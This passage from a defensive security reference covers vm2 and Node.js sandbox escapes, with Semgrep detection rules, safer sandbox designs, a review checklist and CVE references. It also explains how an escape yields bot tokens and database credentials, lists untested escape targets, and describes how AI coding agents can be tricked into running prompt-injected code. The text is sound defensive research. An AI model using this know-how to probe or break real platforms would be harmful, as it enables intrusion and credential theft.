              - pattern: (new NodeVM(...)).run($X)
```

### Lock-file analysis

Cross-link to `cicd_supply_chain_expertise.md` §lockfile-scanning. A separate detection lane: scan `package.json`, `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml` for *any* appearance of `vm2`, including in transitive dependencies. Any direct or transitive dependency on `vm2` is a P1 supply-chain issue; the package should be replaced or removed.

```yaml
rules:
  - id: supply-chain.npm.vm2-dependency
    message: |
      vm2 appears in this lockfile (direct or transitive). vm2 has
      15+ CVSS-9.8 sandbox-escape CVEs and is structurally insecure.
      Run `npm ls vm2` to identify the dependency chain. Remove the
      dependent package or open an issue requesting migration.
    severity: ERROR
    languages: [generic]
    paths:
      include:
        - package-lock.json
        - yarn.lock
        - pnpm-lock.yaml
    pattern-regex: |
      \bvm2["'@:]
```

---

## 9. Defensive Patterns

### The structural answers in priority order

1. **Don't run untrusted JS at all.** The only structurally-correct answer. If you can get the requirement to "the user supplies declarative configuration; the application interprets it," you have eliminated the threat class.
2. **Use a non-Turing-complete configuration language.** TOML, JSON, JSON5, YAML, dhall, jsonnet. The first four are pure-data; dhall is a total functional language with no general recursion; jsonnet is side-effect-free but Turing-complete. If your "users want to write logic" requirement is really "users want to compose declarative rules," push back hard on the "logic" framing.
3. **Use QuickJS-in-Wasm via quickjs-emscripten.** This is the structurally-correct answer when the requirement really is "run untrusted JS." Pays a performance cost relative to V8, but the security boundary is hardware-enforced.
4. **Use isolated-vm.** Better than vm2 by orders of magnitude. The boundary is V8-isolate-enforced, not proxy-membrane-enforced. Pays a marshalling cost on every host-guest call. Caveat: still in-process; a V8-isolate bug (rare but they exist; Pwn2Own-grade) escapes the boundary.
5. **Use out-of-process workers with capability-typed IPC.** Spawn a child process (`child_process.fork`), run the guest there, communicate via structured IPC. The OS process boundary is the strongest practical boundary. Pays a per-call IPC cost. Cross-link to `agentic_web_capabilities_expertise.md` for the broader capability-system discussion.
6. **As a last resort, use Wasm runtimes (`wasmtime`, `wasmer`) with explicit WASI capability sets.** Requires the guest to compile to Wasm; the host trust base shrinks to "the Wasm runtime and the imported host functions."
7. **Do not use vm, vm2, safe-eval, or anything that markets itself as a "secure sandbox" without a published threat model and bug bounty.**

### Code review checklist

- [ ] `require('vm2')` / `import 'vm2'` / `require('safe-eval')` / `require('vm2-process')` anywhere in the codebase — flag P1.
- [ ] `eval(...)` with any non-string-literal argument — audit source; user-reachable path is P0.
- [ ] `new Function(body, ...)` with non-literal body — same as `eval`.
- [ ] `vm.runInThisContext` / `runInNewContext` / `runInContext` with user-controlled code — P1 regardless (not a security boundary).
- [ ] `vm.createContext(sandbox)` — if `sandbox` is not literal `{}` / `Object.create(null)`, audit every property for prototype reach.
- [ ] `isolated-vm` — is the host-registered function set minimal? Each registered function is a capability grant.
- [ ] `NodeVM` (vm2) configured with `require: { ... }` — each exposed module is RCE if the guest is adversarial.
- [ ] Guest code sharing the process with auth/secrets state or DB connection pool — redesign; blast radius is the whole process.
- [ ] CPU, memory, and *timeout* limits enforced on the guest — even a perfect sandbox is a DoS vector without them.
- [ ] Deployment-platform process boundary (Lambda per-invocation, K8s pod) present — if so, the in-process sandbox is defense-in-depth, not the primary boundary.
- [ ] For AI-agent runtimes (Claude Code `Bash` running `node -e`, Cursor plugins): is eval'd code reviewed before execution? Cross-link `llm_agent_security_expertise.md` §code-execution-tool.

---

## 10. vm2-in-the-Supply-Chain — The Meta-Vulnerability

### The cascade

vm2 is used by *platforms that run other people's JavaScript.* Canonical configurations:

- **Discord / chat-bot platforms** that let users author server-side scripts. The platform's process has the bot's authentication token; an escape gives the attacker the token (`process.env.DISCORD_BOT_TOKEN`), which gives access to every server the bot has joined.
- **Code-execution-as-a-service** products with a server-side evaluator. The platform's process has the database connection; an escape gives the attacker the connection string and every other user's snippets.
- **Low-code automation platforms** (Zapier-likes, Workato-likes). The platform's process holds API tokens for every connected integration; an escape yields the full authentication material set.
- **Server-side template renderers** (Squiz Matrix, several CMSes) that allow inline JS expressions. The web-tier process owns DB and filesystem.

The cascade: vm2 escape → host process compromise → trust-chain compromise of downstream users. **Blast radius is all the data the host process has access to**, generally "all the customer data on this platform." Cross-link to `cicd_supply_chain_expertise.md` §6 for the broader real-incident corpus.

### The "vendor told me they sandboxed it" problem

If you are evaluating a third-party product that runs user-supplied code, ask the vendor *what* the sandbox boundary is. The correct answers name a specific boundary technology: "isolated-vm with N registered host functions," "QuickJS-in-Wasm with these WASI capabilities," "forked child process with seccomp / pledge / Job objects." The incorrect answer is "we use vm2" or the unspecific "we built a custom sandbox." Marketing that does not name the boundary technology should be treated as marketing.

---

## 11. Variant Analysis — Under-Explored

The following are candidate primitives, not confirmed CVEs. Each is a place where the structural problem of in-process JS sandboxing likely surfaces, and where targeted research would be productive.

- **WebContainers (StackBlitz).** A Wasm-compiled Node.js running inside the browser. The in-Wasm boundary is structurally sound; the open question is cross-tab / cross-origin leakage via shared Worker state, OPFS, or IndexedDB.
- **Cloudflare Workers V8 isolates.** Per-tenant V8 isolates at scale. Public hardening is extensive. Open question: are there shared host functions whose implementation leaks per-tenant data?
- **AWS Lambda warm-start state leakage.** Lambda reuses processes across invocations of the same function. For custom-runtime configurations that eval user-supplied code (low-code platforms), the per-invocation boundary is weaker than expected. Scan for vm2 in Lambda layers.
- **In-process plugin patterns in commercial products.** BI tools, CRM customizations, in-app rule engines — almost always vm2 (legacy) or `eval`-with-pre-filtering (custom). VS Code's extension model is *not* in this class (Extension Host is a separate process — the right design).
- **AI code-execution sandboxes.** Claude Code, Cursor, etc. running generated code in the user's project: *there is no sandbox by default.* The agent has the user's permissions. Research question shifts from "can it escape" to "can it be tricked into running prompt-injected code." Cross-link to `llm_agent_security_expertise.md` §prompt-injection-to-code-execution. Anthropic's Claude Code runs on the host; its OS-level Bash sandbox (Seatbelt on macOS, bubblewrap on Linux) is off by default.
- **IDE-extension snippet-preview features.** Some run in the extension host (full perms), some use Wasm or child processes. Worth auditing popular extensions for `eval`/`Function`/`vm.runInThisContext` on user input.
- **JS template engines accepting user-controlled template source.** Handlebars, EJS, Pug, Nunjucks, doT, Underscore — when source (not just values) is user-controlled, the compile path lands in `new Function(compiledSource)`. Cross-link to `template_code_injection_expertise.md`.

---

## 12. References

### Anchor case (Kurt's disclosure)

- Katie Paxton-Fear and Kurt Boberg, "New Sandbox Escape Affecting Popular nodejs Sandbox library vm2" — Semgrep blog, January 27, 2026. https://semgrep.dev/blog/2026/calling-back-to-vm2-and-escaping-sandbox
- CVE-2026-22709 — NVD: https://nvd.nist.gov/vuln/detail/CVE-2026-22709
- GHSA-99p7-6v5w-7xg8 — GitHub Security Advisory: https://github.com/advisories/GHSA-99p7-6v5w-7xg8
- Endor Labs analysis: https://www.endorlabs.com/learn/cve-2026-22709-critical-sandbox-escape-in-vm2-enables-arbitrary-code-execution

### vm2 — primary sources

- vm2 GitHub repository: https://github.com/patriksimek/vm2
- 2023 discontinuation issue/announcement: https://github.com/patriksimek/vm2/issues/533
- Semgrep, "The indomitable maintainer spirit versus the indifferent cruelty of JavaScript" (July 2023): https://semgrep.dev/blog/2023/discontinuation-of-node-vm2/
- Snyk vm2 vulnerability index: https://security.snyk.io/package/npm/vm2

### Instructive vm2 CVEs

- CVE-2021-23449 — Sandbox bypass via prototype pollution: https://security.snyk.io/vuln/SNYK-JS-VM2-1585918
- CVE-2022-36067 ("Sandbreak") — Oxeye Security disclosure
- CVE-2023-29017 — `Error.prepareStackTrace` (Seongil Wi / KAIST WSP): https://github.com/advisories/GHSA-7jxr-cg7f-gpgv. PoC gist: https://gist.github.com/seongil-wi/2a44e082001b959bfe304b62121fb76d
- CVE-2023-29199 — Source-transformer bypass: https://github.com/advisories/GHSA-xj72-wvfv-8985
- CVE-2023-30547 — Host-thrown Error reach: GitHub advisory
- CVE-2023-32314 — Host object creation via the `Proxy` specification (Takeshi Kaneko / arkark / GMO Cybersecurity): https://github.com/advisories/GHSA-whpj-8f3w-67p5. PoC gist: https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac
- CVE-2023-37466 — Promise handler sanitization bypass: https://github.com/advisories/GHSA-cchq-frgv-rjh5
- CVE-2026-24118 — `__lookupGetter__` escape (XmiliaH): GitHub advisory
- CVE-2026-24120 — Promise `species` patch bypass (XmiliaH): GitHub advisory
- CVE-2026-44001 — Promise constructor unhandled rejection process-crash: https://advisories.gitlab.com/npm/vm2/CVE-2026-44001/
- The Hacker News round-up (May 2026): https://thehackernews.com/2026/05/vm2-nodejs-library-vulnerabilities.html

### Alternative sandboxes

- isolated-vm (Marcel Laverdet): https://github.com/laverdet/isolated-vm
- QuickJS (Fabrice Bellard): https://bellard.org/quickjs/
- quickjs-emscripten: https://github.com/justjake/quickjs-emscripten
- quickjs-ng (community fork, active): https://github.com/quickjs-ng/quickjs
- wasmtime: https://wasmtime.dev/
- wasmer: https://wasmer.io/
- Deno permissions model: https://docs.deno.com/runtime/manual/basics/permissions/

### Node.js `vm` module documentation

- Node.js `vm` module reference (security notice): https://nodejs.org/api/vm.html
- "node:vm Is Not a Sandbox. Stop Using It Like One." (dev.to community writeup): https://dev.to/dendrite_soup/nodevm-is-not-a-sandbox-stop-using-it-like-one-2f74

### Browser sandbox / WebKit

- Filip Pizlo, "What Spectre and Meltdown Mean for WebKit" (WebKit blog, Jan 2018): https://webkit.org/blog/8048/what-spectre-and-meltdown-mean-for-webkit/
- Chrome Site Isolation overview: https://www.chromium.org/Home/chromium-security/site-isolation/

### "You cannot sandbox a fast language"

- LuaJIT FAQ (Mike Pall): https://luajit.org/faq.html
- Hacker News discussion "LuaJIT is not sandboxed": https://news.ycombinator.com/item?id=23620091

### Snyk research and community writeups

- Snyk, "The security concerns of a JavaScript sandbox with the Node.js VM module": https://snyk.io/blog/security-concerns-javascript-sandbox-node-js-vm-module/
- BleepingComputer coverage of vm2 escapes (multiple, 2023–2026)
- PortSwigger / Daily Swig coverage: https://portswigger.net/daily-swig/javascript-sandbox-vm2-remediates-remote-code-execution-risk
- Uptycs, "Uncovering Potentially Exploitable vm2 Vulnerabilities: CVE-2023-29017": https://www.uptycs.com/blog/threat-research-report-team/exploitable-vm2-vulnerabilities

### Cross-references within this expertise corpus

- `deserialization_expertise.md` — gadget-chain primitives, Property-Oriented Programming, structural defense via allowlist
- `prototype_pollution_expertise.md` — Object.prototype reachability, recursive-merge anti-pattern, the structural reason JS objects carry reach across boundaries
- `llm_agent_security_expertise.md` — agent runtimes that execute generated code; prompt-injection-to-code-execution paths
- `cicd_supply_chain_expertise.md` — lock-file scanning, transitive-dependency risk, real-incident corpus
- `agentic_web_capabilities_expertise.md` — capability-system discipline, POLA, WASI as a worked example
- `code_review_expertise.md` — auditing methodology, click-count severity for sandbox-adjacent code
- `semgrep_rule_authoring.md` — rule-shape guidance, taint mode, severity assignment
- `vulnerability_research_methodology_expertise.md` — variant analysis, the "next-CVE" lane after a structural finding
- `template_code_injection_expertise.md` — SSTI in JS template engines; the same boundary problem in a narrower domain
- `redos_algorithmic_dos_expertise.md` — DoS as a residual threat even in correctly-sandboxed guests
- `cryptography_expertise.md` — Spectre / speculative side-channels, why renderer-process isolation became necessary
- `http_web_security.md` — iframe sandbox attribute, CSP, the browser-layer adjacent boundaries
